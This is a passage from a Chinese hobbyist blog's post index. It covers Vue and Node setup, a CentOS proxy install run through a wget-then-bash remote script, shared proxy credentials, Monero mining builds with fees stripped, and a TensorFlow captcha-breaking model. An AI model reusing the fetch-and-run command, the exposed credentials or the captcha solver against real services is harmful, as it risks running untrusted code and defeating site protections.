解决了一天。先来讲讲这个小程序项目吧。 我是在这个微信商城小程序项目二次开发(基本的框架还是别人搭的)，前后端分离的项目。用到的技术 核心框架：Spring Boot 2.0 安全框架：Apache Shiro 1.4 视图框架：Jfinal Enjoy 持久层框架：Jfinal ORM 定时器：Quartz 2.3 数据库连接池：Druid 1.0 日志管理：logback 页面交互：Vue2.x 先来张它那漂亮的照片吧 咳咳跑题了 好了 继续解决Vue 环境 win10 64位 专业版 Node 8.12.0 npm 6.4.1 cnpm 用的淘宝镜像 一键安装 npm install -g cnpm –registry=https://registry.npm.taobao.org Vue 2.9.6 安装 Node.js安装 去官网https://nodejs.org/en/ 直接下载完后安装 配置一下环境变量 node -v是查看版本的 安装全局vue-cil 全局-g npm install vue-cli -g PS：注意配置环境变量哦 使用使用cmd 例如我想在桌面创建一个vue项目就cd C:\\Users\\Daizouyang\\Desktop\\Vue 输入下面命令 mydemo是项目名称 vue init webpack mydemo 安装 npm install 编译 npm run build 运行 npm run dev 下次再运行的时候，只需进入项目，再npm run dev即可","categories":[{"name":"vue","slug":"vue","permalink":"https://www.5658.pw/categories/vue/"}],"tags":[{"name":"开发","slug":"开发","permalink":"https://www.5658.pw/tags/开发/"},{"name":"js","slug":"js","permalink":"https://www.5658.pw/tags/js/"},{"name":"集群","slug":"集群","permalink":"https://www.5658.pw/tags/集群/"},{"name":"分布式","slug":"分布式","permalink":"https://www.5658.pw/tags/分布式/"}]},{"title":"CentOS7.5搭建 ssr vpn用于翻墙","slug":"CentOS7-5搭建-ssr-vpn用于翻墙","date":"2018-11-01T06:36:22.000Z","updated":"2018-12-26T11:04:15.496Z","comments":true,"path":"2018/11/01/CentOS7-5搭建-ssr-vpn用于翻墙/","link":"","permalink":"https://www.5658.pw/2018/11/01/CentOS7-5搭建-ssr-vpn用于翻墙/","excerpt":"前言有人说我们看到的网络只是冰山一角,so我打算去’暗网‘这座冰山里看一下 迫于无奈国内访问无法访问，就连好用的Googel都上不去。 PS:请勿将此用于违法犯罪之技,一切后果自己承担。","text":"前言有人说我们看到的网络只是冰山一角,so我打算去’暗网‘这座冰山里看一下 迫于无奈国内访问无法访问，就连好用的Googel都上不去。 PS:请勿将此用于违法犯罪之技,一切后果自己承担。 环境+配置 CentOS 7.5 64位 1H 512M 20G SSD 100M带宽 工具:Xshell 开始一键编译安装 wget -N –no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh 输入1开始安装 如果已安装请跳过此步骤 端口:8080 密码:ouyang 加密方式:1 -none 协议插件:1 -origin 混淆插件:5 -tls1.2_ticket_auth 选择Y进行安装 设备数量 端口限速 这三个直接回车 出现配置信息即完成 教程视频 PS:以上都可以自定义、按自己的需求配置即可，大牛勿喷。 使用打开ShadowsocksR-dotnet4.0进行连接 没有这个工具的小伙伴可以到http://freeshadow.net/#去下载 打开浏览器 打开Google官网 看下能否打开 输入ip/打开https://whoer.net/zh看下自己的ip是否与自己的ip一致 可以看到我这边已经成功了 最后送给大家一个美国的节点 可免校园网哦 有效期免费一年 服务器地址：racernet-vip-us4.racernet-node.space服务器端口：115加密方式：aes-256-cfb密码：F0uyIC协议：auth_aes128_sha1协议参数：995:GRgfAv混淆：http_simple混淆参数：HK2SCH1300cd432995.wns.windows.com","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.5658.pw/categories/Linux/"}],"tags":[{"name":"SSR","slug":"SSR","permalink":"https://www.5658.pw/tags/SSR/"},{"name":"VPN","slug":"VPN","permalink":"https://www.5658.pw/tags/VPN/"},{"name":"跳板","slug":"跳板","permalink":"https://www.5658.pw/tags/跳板/"},{"name":"翻墙","slug":"翻墙","permalink":"https://www.5658.pw/tags/翻墙/"},{"name":"加速","slug":"加速","permalink":"https://www.5658.pw/tags/加速/"},{"name":"匿名","slug":"匿名","permalink":"https://www.5658.pw/tags/匿名/"}]},{"title":"Centos 挖矿","slug":"Centos-挖矿","date":"2018-10-25T12:07:41.000Z","updated":"2018-12-10T13:40:45.417Z","comments":true,"path":"2018/10/25/Centos-挖矿/","link":"","permalink":"https://www.5658.pw/2018/10/25/Centos-挖矿/","excerpt":"前言上次给大家写了一个Windows的xmrig的编译教程,然后就有小伙伴问我Linux服务器能不能挖矿 因为很久没有关注挖矿了,So….. 技术有点退后….咳咳 该学习了呀。","text":"前言上次给大家写了一个Windows的xmrig的编译教程,然后就有小伙伴问我Linux服务器能不能挖矿 因为很久没有关注挖矿了,So….. 技术有点退后….咳咳 该学习了呀。 安装依赖环境 yum install centos-release-scl epel-release -y yum install cmake3 devtoolset-4-gcc* hwloc-devel libmicrohttpd-devel openssl-devel make git -y scl enable devtoolset-4 bash 下载挖矿源码 git clone https://github.com/fireice-uk/xmr-stak.git PS:注意,从github上克隆完成后,要修改一下默认的作者抽费率的设置 否则默认的作者要从你挖的结果中抽掉2%,修改文件xmr-stak/xmrstak/donate-level.hpp 中默认的2.0改为0.0 在这里修改哦constexpr double fDevDonationLevel = 0.0 / 100.0 配置与编译 cd xmr-stak/ cmake3 . -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF make install 开始挖矿吧 cd bin/ ./xmr-stak 输入0 因为这里是2.5.1版本的 作者挖的是门罗 所以选择monero 之前的版本是monero7 根据实际情况选择 输入你挖的矿池pool.minexmr.com 输入钱包 ** 接着x或者起个名字 直接回车 接着输入n n n 你也可以根绝自己的需求更改","categories":[{"name":"挖矿","slug":"挖矿","permalink":"https://www.5658.pw/categories/挖矿/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.5658.pw/tags/Linux/"},{"name":"挖矿","slug":"挖矿","permalink":"https://www.5658.pw/tags/挖矿/"},{"name":"算法","slug":"算法","permalink":"https://www.5658.pw/tags/算法/"},{"name":"xmr-stak","slug":"xmr-stak","permalink":"https://www.5658.pw/tags/xmr-stak/"},{"name":"门罗币","slug":"门罗币","permalink":"https://www.5658.pw/tags/门罗币/"}]},{"title":"Centos安装nodejs","slug":"Centos安装nodejs","date":"2018-10-25T11:52:43.000Z","updated":"2018-12-10T13:37:27.214Z","comments":true,"path":"2018/10/25/Centos安装nodejs/","link":"","permalink":"https://www.5658.pw/2018/10/25/Centos安装nodejs/","excerpt":"环境Centos 7.5 64","text":"环境Centos 7.5 64 安装命令1.安装Nodejs sudo yum install epel-release sudo yum install nodejs 安装完成输入 node -v 查看版本 如果出现版本号 说明已经安装成功了 2.安装npm sudo yum install npm –enablerepo=epel sudo npm install -g express sudo npm install -g express-generator 同上npm -v 查看npm版本号","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.5658.pw/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.5658.pw/tags/Linux/"},{"name":"工具","slug":"工具","permalink":"https://www.5658.pw/tags/工具/"},{"name":"方法","slug":"方法","permalink":"https://www.5658.pw/tags/方法/"}]},{"title":"MySql导入SQL错误","slug":"MySql导入SQL错误","date":"2018-10-14T23:50:28.000Z","updated":"2018-12-10T13:40:52.622Z","comments":true,"path":"2018/10/15/MySql导入SQL错误/","link":"","permalink":"https://www.5658.pw/2018/10/15/MySql导入SQL错误/","excerpt":"前言最近帮别人搭建一些棋牌站与SSC站,自己平时没事也喜欢搭建一些棋牌、论坛、博客、SSC等一些带有娱乐性的商业站。自己的空间到期了,懒得续了买了用处也不大。","text":"前言最近帮别人搭建一些棋牌站与SSC站,自己平时没事也喜欢搭建一些棋牌、论坛、博客、SSC等一些带有娱乐性的商业站。自己的空间到期了,懒得续了买了用处也不大。 过程搭建38彩的时候,导入SQL文件的时候碰见如下错误 Access denied; you need (at least one of) the SUPER privilege(s) for this operation 其实在本地测试的时候用这个DEFINER=root@localhost还没报错 解决很简单把sql语句中的 DEFINER=root@localhost去掉就可以了 结语不仅是在搭建的时候,在平常写代码的时候报了错,首先看控制台报错代码在哪一行 其次看报错提示,一般用IDEA都会提示的像博主我用Edit的就没那么幸运了。看下报错 的语句,一般都是英文 英语不好的同学可以去百度翻译下什么意思比如开头的错可翻译为 访问被拒绝；您需要（至少一个）此操作的超级特权 首先访问被拒应该想到权限问题。如果自己没遇到类似的问题可以去百度查这个错误代码的原因。 不要一报错就去跑去问老师、领导,这样不仅暴露了你敲代码的经验与习惯,更能看出你这个人做事的态度。","categories":[{"name":"数据库","slug":"数据库","permalink":"https://www.5658.pw/categories/数据库/"}],"tags":[{"name":"搭建","slug":"搭建","permalink":"https://www.5658.pw/tags/搭建/"},{"name":"MySql","slug":"MySql","permalink":"https://www.5658.pw/tags/MySql/"}]},{"title":"win10 xmrig 挖矿 编译","slug":"win10-xmrig-挖矿-编译","date":"2018-10-12T04:59:08.000Z","updated":"2018-12-10T13:40:53.475Z","comments":true,"path":"2018/10/12/win10-xmrig-挖矿-编译/","link":"","permalink":"https://www.5658.pw/2018/10/12/win10-xmrig-挖矿-编译/","excerpt":"前言近两年以来,区块链的流行与火热,挖矿成了众人眼中发家致富的“财宝”了。当然博主也不会落后于网络啊。博主今年3、4月份左右看上“门罗币”了,因为没多余的显卡去挖莱特币、加上门罗币只需要CPU就可以挖了(也可以用CPU+GPU)。之前用的2.6.3版本的,最近接到框池的通知需要更新XMRig2.8版本以上 so….","text":"前言近两年以来,区块链的流行与火热,挖矿成了众人眼中发家致富的“财宝”了。当然博主也不会落后于网络啊。博主今年3、4月份左右看上“门罗币”了,因为没多余的显卡去挖莱特币、加上门罗币只需要CPU就可以挖了(也可以用CPU+GPU)。之前用的2.6.3版本的,最近接到框池的通知需要更新XMRig2.8版本以上 so…. 废话不多说教大家编译官方的xmrig挖矿工具。 PS:官方有编译好的二进制版本 直接可以用 当然抽水是少不了的。 编译前准备 系统: win10 x64 .Net Framework4.6https://www.microsoft.com/en-us/download/details.aspx?id=48137 VS 2017 communityhttps://docs.microsoft.com/zh-cn/visualstudio/productinfo/installing-an-earlier-release-of-vs2017 CMake for Win64https://cmake.org/download/ NVIDIA CUDA https://developer.nvidia.com/cuda-downloads AMD APP SDK 3.0 OpenSSL/Hwloc and Microhttpd依赖包 链接：https://pan.baidu.com/s/1G5w2TRBI_T9g5ezbxI0VJQ 提取码：577s xmr-stak源代码 链接：https://pan.baidu.com/s/1ckCix6A59CfcYlb4hgw0tQ 提取码：54za 博主自己编译好的,已去抽水 链接：https://pan.baidu.com/s/1CwwrTnVzHn-akXxm6UZdxw 提取码：vapy 软件的安装Visual Studio 2017 Community在安装Visual Studio 2017 Community的时候，除了要使用15.4.5版本外，要选中左边的“使用C++的桌面开发”和右边的“用于桌面的 VC++ 2015.3 c140 工具集(x86，x64)”。 CMake for Win64我使用的是CMake 3.13.0版本，在安装的时候注意选择“Add CMake to the system PATH for all users”。 CUDA和AMD APP SDK（可选）在安装CUDA的时候，默认的自定义安装是全选的，如果你想最小化安装，请选择： CUDA/Develpment CUDA/Visual Studio Integration (ignore the warning during the install that VS2017 is not supported) CUDA/Runtime Driver components PS:如果挖矿的时候只用CPU，那么可以不用安装CUDA和AMD APP SDK。AMD APP SDK安装还是蛮简单的，官网的下载器经常会下载出错，在准备工作中有一个可以直接下载的链接 编译上面的基础工作准备好之后，编译还是很快的。 解压xmr-deps-3.3.zip，放到C盘根目录下，C:\\xmrig-deps。解压xmrig的源代码，也放到C盘根目录下，C:\\xmrig。 打开cmd对话框， cd c:\\xmrig-deps ，进入xmrig-deps目录，运行 tree . 看看这个目录结构和下面是否一致。 如果内容和图片一样， cd c:\\xmr-stak 进入xmr-stak目录，然后一条一条运行下面的命令： 12345678910111213&quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\Common7\\Tools\\VsMSBuildCmd.bat&quot;set CMAKE_PREFIX_PATH=C:\\xmrig-deps\\hwloc;C:\\xmrig-deps\\libmicrohttpd;C:\\xmrig-deps\\opensslcd c:\\xmrigmkdir buildcd buildcmake .. -G &quot;Visual Studio 15 2017 Win64&quot; -DXMRIG_DEPS=c:\\xmrig-deps\\msvc2017\\x64cmake --build . --config Release --target install 在编译的过程中，会出现“可能丢失数据”的警告，这个可以忽略，只要没有错误就行。 如果不需要编译显卡挖矿，把 1cmake .. -G &quot;Visual Studio 15 2017 Win64&quot; -DXMRIG_DEPS=c:\\xmrig-deps\\msvc2017\\x64 改成以下的： 1cmake .. -G &quot;Visual Studio 15 2017 Win64&quot; -DXMRIG_DEPS=c:\\xmrig-deps\\msvc2017\\x64 -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF -DCUDA_ENABLE=OFF表示不编译Nvidia显卡，-DOpenCL_ENABLE=OFF表示不编译AMD显卡。 编译完成后直接去C:\\xmrig\\build 就可以看到xmrig.sln文件了 双击打开使用Visual Studio编译为exe文件 使用新建一个txt文件粘贴一下命令 xmrig.exe –donate-level 0 -o 矿池地址 -u 钱包地址 -px -k PS:文章部分内容来自于网络学习如有侵权,请在下方留言通知博主删除。","categories":[{"name":"挖矿","slug":"挖矿","permalink":"https://www.5658.pw/categories/挖矿/"}],"tags":[{"name":"挖矿","slug":"挖矿","permalink":"https://www.5658.pw/tags/挖矿/"},{"name":"算法","slug":"算法","permalink":"https://www.5658.pw/tags/算法/"},{"name":"区块链","slug":"区块链","permalink":"https://www.5658.pw/tags/区块链/"}]},{"title":"NexT主题中添加网页标题崩溃欺骗搞怪特效","slug":"NexT主题中添加网页标题崩溃欺骗搞怪特效","date":"2018-10-09T03:10:43.000Z","updated":"2018-12-10T13:40:53.100Z","comments":true,"path":"2018/10/09/NexT主题中添加网页标题崩溃欺骗搞怪特效/","link":"","permalink":"https://www.5658.pw/2018/10/09/NexT主题中添加网页标题崩溃欺骗搞怪特效/","excerpt":"给网页title添加一些搞怪特效 crash_cheat.js在next\\source\\js\\src文件夹下创建crash_cheat.js，添加代码：","text":"给网页title添加一些搞怪特效 crash_cheat.js在next\\source\\js\\src文件夹下创建crash_cheat.js，添加代码： 1234567891011121314151617&lt;!--崩溃欺骗--&gt; var OriginTitle = document.title; var titleTime; document.addEventListener(&apos;visibilitychange&apos;, function () &#123; if (document.hidden) &#123; $(&apos;[rel=&quot;icon&quot;]&apos;).attr(&apos;href&apos;, &quot;http://yun.name168.cn/TEP.ico&quot;); document.title = &apos;╭(°A°`)╮ 页面崩溃啦 ~&apos;; clearTimeout(titleTime); &#125; else &#123; $(&apos;[rel=&quot;icon&quot;]&apos;).attr(&apos;href&apos;, &quot;/favicon.ico&quot;); document.title = &apos;(ฅ&gt;ω&lt;*ฅ) 噫又好了~&apos; + OriginTitle; titleTime = setTimeout(function () &#123; document.title = OriginTitle; &#125;, 2000); &#125; &#125;); 调用在next\\layout_layout.swig文件中，添加引用（注：在swig末尾添加）： 1&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/crash_cheat.js&quot;&gt;&lt;/script&gt;","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.5658.pw/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.5658.pw/tags/Hexo/"}]},{"title":"深度学习-验证码识别","slug":"深度学习-验证码识别","date":"2018-10-09T02:18:21.000Z","updated":"2018-12-10T13:38:24.384Z","comments":true,"path":"2018/10/09/深度学习-验证码识别/","link":"","permalink":"https://www.5658.pw/2018/10/09/深度学习-验证码识别/","excerpt":"环境1.Win10 64位 2.Python 3.5.6 3.Anaconda Tensorflow-Gpu 1.10.0","text":"环境1.Win10 64位 2.Python 3.5.6 3.Anaconda Tensorflow-Gpu 1.10.0 PS:Python 库如下图 (pip list查看此电脑已安装的库) 基本配置1.分别新建trainImage(放置训练样本)、model(存放模型)、captcha_image(识别样本) 2.安装captcha 利用captcha生成样本集 captcha安装命令:pip install captcha ps:captcha安装可能需要翻墙 如缺少其他依赖 pip install ‘库名’ 可按照上面图安装 生成验证码样本集如果用手动标记会很累,So,用captcha自动生成样本集 编写input_data.py input_data.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445from captcha.image import ImageCaptchaimport numpy as npfrom PIL import Imageimport randomimport cv2import os # 验证码中的字符#number = [&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;] alphabet = [&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;,&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;, &apos;k&apos;, &apos;l&apos;, &apos;m&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;, &apos;s&apos;, &apos;t&apos;, &apos;u&apos;,&apos;v&apos;, &apos;w&apos;, &apos;x&apos;, &apos;y&apos;, &apos;z&apos;,&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;, &apos;F&apos;, &apos;G&apos;, &apos;H&apos;, &apos;I&apos;, &apos;J&apos;, &apos;K&apos;, &apos;L&apos;, &apos;M&apos;, &apos;N&apos;, &apos;O&apos;, &apos;P&apos;, &apos;Q&apos;, &apos;R&apos;, &apos;S&apos;, &apos;T&apos;, &apos;U&apos;,&apos;V&apos;, &apos;W&apos;, &apos;X&apos;, &apos;Y&apos;, &apos;Z&apos;] # 验证码长度为4个字符def random_captcha_text(char_set=alphabet, captcha_size=4): captcha_text = [] for i in range(captcha_size): c = random.choice(char_set) captcha_text.append(c) return captcha_text # 生成字符对应的验证码def gen_captcha_text_and_image(): image = ImageCaptcha() captcha_text = random_captcha_text() captcha_text = &apos;&apos;.join(captcha_text) captcha = image.generate(captcha_text) captcha_image = Image.open(captcha) captcha_image = np.array(captcha_image) return captcha_text, captcha_image if __name__ == &apos;__main__&apos;: #保存路径 path = &apos;trainImage&apos; # path = &apos;./validImage&apos; for i in range(10000): text, image = gen_captcha_text_and_image() fullPath = os.path.join(path, text + &quot;.jpg&quot;) cv2.imwrite(fullPath, image) print (&quot;&#123;0&#125;/10000&quot;.format(i)) print (&quot;/完成!&quot;) 可以在trainImage文件夹看到已经生成了1W张样本了 训练验证集利用tensorflow进行样本集的训练。最好使用GPU版本的tensorflow 博主刚开始用的CPU跑的,发现CPU太慢了！！！ 编辑train.py train.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112import numpy as npimport tensorflow as tfimport cv2import osimport randomimport timeos.environ[&apos;TF_CPP_MIN_LOG_LEVEL&apos;] = &apos;2&apos; number = [&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;]alphabet = [&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;,&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;, &apos;k&apos;, &apos;l&apos;, &apos;m&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;, &apos;s&apos;, &apos;t&apos;, &apos;u&apos;,&apos;v&apos;, &apos;w&apos;, &apos;x&apos;, &apos;y&apos;, &apos;z&apos;,&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;, &apos;F&apos;, &apos;G&apos;, &apos;H&apos;, &apos;I&apos;, &apos;J&apos;, &apos;K&apos;, &apos;L&apos;, &apos;M&apos;, &apos;N&apos;, &apos;O&apos;, &apos;P&apos;, &apos;Q&apos;, &apos;R&apos;, &apos;S&apos;, &apos;T&apos;, &apos;U&apos;,&apos;V&apos;, &apos;W&apos;, &apos;X&apos;, &apos;Y&apos;, &apos;Z&apos;]data_dir = &apos;captcha_image&apos;width = 160height = 60max_captcha = 4batch_size = 150num_numbers = len(alphabet)def get_train_data(data_dir = data_dir): simples = &#123;&#125; for file_name in os.listdir(data_dir): captcha = file_name.split(&apos;.&apos;)[0] simples[data_dir + &apos;/&apos; + file_name] = captcha return simplessimples = get_train_data(data_dir)file_simples = list(simples.keys())num_simples = len(simples) def get_next_batch(): batch_x = np.zeros([batch_size, width * height]) batch_y = np.zeros([batch_size, num_numbers * max_captcha]) for i in range(batch_size): file_name = file_simples[random.randint(0, num_simples - 1)] batch_x[i, :] = np.float32(cv2.imread(file_name, 0)).flatten() / 255 batch_y[i, :] = text2vec(simples[file_name]) return batch_x, batch_ydef text2vec(text): return [0 if ord(i) - 48 != j else 1 for i in text for j in range(num_numbers)]####################################################################x = tf.placeholder(tf.float32, [None, width * height], name = &apos;input&apos;)y_ = tf.placeholder(tf.float32, [None, num_numbers * max_captcha])x_image = tf.reshape(x, [-1, height, width, 1])def weight_variable(shape): initial = tf.truncated_normal(shape, stddev = 0.1) return tf.Variable(initial)def bias_variable(shape): initial = tf.constant(0.1, shape = shape) return tf.Variable(initial)def conv2d(x, W): return tf.nn.conv2d(x, W, strides = [1, 1, 1, 1], padding = &apos;SAME&apos;)def max_pool_2x2(x): return tf.nn.max_pool(x, ksize = [1, 2, 2, 1], strides = [1, 2, 2, 1], padding = &apos;SAME&apos;)W_conv1 = weight_variable([5, 5, 1, 32])b_conv1 = bias_variable([32])h_conv1 = tf.nn.relu(conv2d(x_image, W_conv1) + b_conv1)h_pool1 = max_pool_2x2(h_conv1)W_conv2 = weight_variable([5, 5, 32, 64])b_conv2 = bias_variable([64])h_conv2 = tf.nn.relu(conv2d(h_pool1, W_conv2) + b_conv2)h_pool2 = max_pool_2x2(h_conv2)W_conv3 = weight_variable([5, 5, 64, 64])b_conv3 = bias_variable([64])h_conv3 = tf.nn.relu(conv2d(h_pool2, W_conv3) + b_conv3)h_pool3 = max_pool_2x2(h_conv3)W_fc1 = weight_variable([8 * 20 * 64, 1024])b_fc1 = bias_variable([1024])h_pool3_flat = tf.reshape(h_pool3, [-1, 8 * 20 * 64])h_fc1 = tf.nn.relu(tf.matmul(h_pool3_flat, W_fc1) + b_fc1)W_fc2 = weight_variable([1024, num_numbers * max_captcha])b_fc2 = bias_variable([num_numbers * max_captcha])output = tf.add(tf.matmul(h_fc1, W_fc2), b_fc2)cross_entropy = tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(labels = y_, logits = output))train_step = tf.train.AdamOptimizer(learning_rate = 1e-4).minimize(cross_entropy)predict = tf.reshape(output, [-1, max_captcha, num_numbers])labels = tf.reshape(y_, [-1, max_captcha, num_numbers])correct_prediction = tf.equal(tf.argmax(predict, 2, name = &apos;predict_max_idx&apos;), tf.argmax(labels, 2))accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))def train(): sess = tf.InteractiveSession() saver = tf.train.Saver(max_to_keep=1) tf.global_variables_initializer().run() for i in range(50000000): batch_x, batch_y = get_next_batch() if i % 100 == 0: train_accuracy = accuracy.eval(feed_dict = &#123;x: batch_x, y_: batch_y&#125;) print(&quot;迭代 %d, 精度 %g &quot; % (i, train_accuracy)) #if train_accuracy &gt; 0.60: saver.save(sess, &quot;model/output.model&quot;, global_step = i+1) train_step.run(feed_dict = &#123;x: batch_x, y_: batch_y&#125;)train() PS：如需要训练纯数字的四位验证码 把 num_numbers = len(alphabet) 改为 num_numbers = len(number) 开始测试训练的时候特别慢需要一段时间,如果用台式 有条件的话可以用4个2080跑(博主是笔记本无法外界显卡坞,穷的一逼别说2080了,1080都买不起)编辑test.py test.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import numpy as npimport tensorflow as tfimport cv2import osimport randomimport time os.environ[&apos;TF_CPP_MIN_LOG_LEVEL&apos;] = &apos;2&apos; number = [&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;]alphabet = [&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;,&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;, &apos;k&apos;, &apos;l&apos;, &apos;m&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;, &apos;s&apos;, &apos;t&apos;, &apos;u&apos;,&apos;v&apos;, &apos;w&apos;, &apos;x&apos;, &apos;y&apos;, &apos;z&apos;,&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;, &apos;F&apos;, &apos;G&apos;, &apos;H&apos;, &apos;I&apos;, &apos;J&apos;, &apos;K&apos;, &apos;L&apos;, &apos;M&apos;, &apos;N&apos;, &apos;O&apos;, &apos;P&apos;, &apos;Q&apos;, &apos;R&apos;, &apos;S&apos;, &apos;T&apos;, &apos;U&apos;,&apos;V&apos;, &apos;W&apos;, &apos;X&apos;, &apos;Y&apos;, &apos;Z&apos;]data_dir = &apos;captcha_image&apos;width = 160height = 60max_captcha = 4batch_size = 64num_numbers = len(alphabet)def get_train_data(data_dir = data_dir): simples = &#123;&#125; for file_name in os.listdir(data_dir): captcha = file_name.split(&apos;.&apos;)[0] simples[data_dir + &apos;/&apos; + file_name] = captcha return simplessimples = get_train_data(data_dir)file_simples = list(simples.keys())num_simples = len(simples) def test(input_, label_): saver = tf.train.import_meta_graph(&apos;model/output.model-98501.meta&apos;) graph = tf.get_default_graph() inputs = graph.get_tensor_by_name(&apos;input:0&apos;) predict_max_idx = graph.get_tensor_by_name(&apos;predict_max_idx:0&apos;) with tf.Session() as sess: saver.restore(sess, tf.train.latest_checkpoint(&apos;model&apos;)) predict = sess.run(predict_max_idx, feed_dict = &#123;inputs:[input_]&#125;) print(predict[0], label_, predict[0] == label_)for i in range(num_simples): input_ = np.float32(cv2.imread(file_simples[i], 0)).flatten() / 255 label_ = [ord(captcha) - 48 for captcha in simples[file_simples[i]]] test(input_, label_) print(file_simples[i]) 调用model里位模型文件进行识别 PS:因为在训练的时候我用的覆盖式的训练方法 所以把 saver = tf.train.import_meta_graph(‘model/output.model-98501.meta’) 里面的模型文件名改为最后你训练完成的那个名称。 此文章只适合初学新手(像我这样的),大牛勿喷！","categories":[{"name":"深度学习","slug":"深度学习","permalink":"https://www.5658.pw/categories/深度学习/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.5658.pw/tags/算法/"},{"name":"深度学习","slug":"深度学习","permalink":"https://www.5658.pw/tags/深度学习/"},{"name":"Python","slug":"Python","permalink":"https://www.5658.pw/tags/Python/"},{"name":"验证码识别","slug":"验证码识别","permalink":"https://www.5658.pw/tags/验证码识别/"}]},{"title":"Jsp+Servlet+JavaBean上传图片并显示","slug":"Jsp-Servlet-JavaBean上传图片并显示","date":"2018-10-05T02:33:25.000Z","updated":"2018-12-10T13:40:51.063Z","comments":true,"path":"2018/10/05/Jsp-Servlet-JavaBean上传图片并显示/","link":"","permalink":"https://www.5658.pw/2018/10/05/Jsp-Servlet-JavaBean上传图片并显示/","excerpt":"开发环境1.MyEclipse 2017 2.Jdk 7.0 3.Win10","text":"开发环境1.MyEclipse 2017 2.Jdk 7.0 3.Win10 基本配置1.依次导入commons-fileupload-1.3.3.jar、commons-io-2.6.jar两个Jar包和jquery-3.1.1.min.js,然后再创建一个upload文件夹。 配置图如下 Tips:jar包别忘了Build Path 哦！ 创建Servlet类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192package com.xiaodai.server;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.util.Date;import java.util.List;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.apache.commons.fileupload.FileItem;import org.apache.commons.fileupload.FileUploadException;import org.apache.commons.fileupload.disk.DiskFileItemFactory;import org.apache.commons.fileupload.servlet.ServletFileUpload;public class fileUpload extends HttpServlet &#123; /** * */ private static final long serialVersionUID = 1L; public void doGet(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException &#123; request.setCharacterEncoding(&quot;utf-8&quot;); // 设置编码 String fName = &quot;&quot;; String suffix = &quot;&quot;; DiskFileItemFactory factory = new DiskFileItemFactory(); String path = this.getServletContext().getRealPath(&quot;upload&quot;); factory.setRepository(new File(path)); // 设置 缓存的大小，当上传文件的容量超过该缓存时，直接放到 暂时存储室 factory.setSizeThreshold(1024 * 1024); // 高水平的API文件上传处理 ServletFileUpload upload = new ServletFileUpload(factory); try &#123; // 可以上传多个文件 List&lt;FileItem&gt; list = (List&lt;FileItem&gt;) upload.parseRequest(request); for (FileItem item : list) &#123; // 获取表单的属性名字 String name = item.getFieldName(); // 如果获取的 表单信息是普通的 文本 信息 if (item.isFormField()) &#123; // 获取用户具体输入的字符串 ，名字起得挺好，因为表单提交过来的是 字符串类型的 String value = item.getString(); request.setAttribute(name, value); &#125; else &#123; // 获取路径名 String value = item.getName(); // 索引到最后一个反斜杠 int start = value.lastIndexOf(&quot;\\\\&quot;); // 截取 上传文件的 字符串名字，加1是 去掉反斜杠， String filename = value.substring(start + 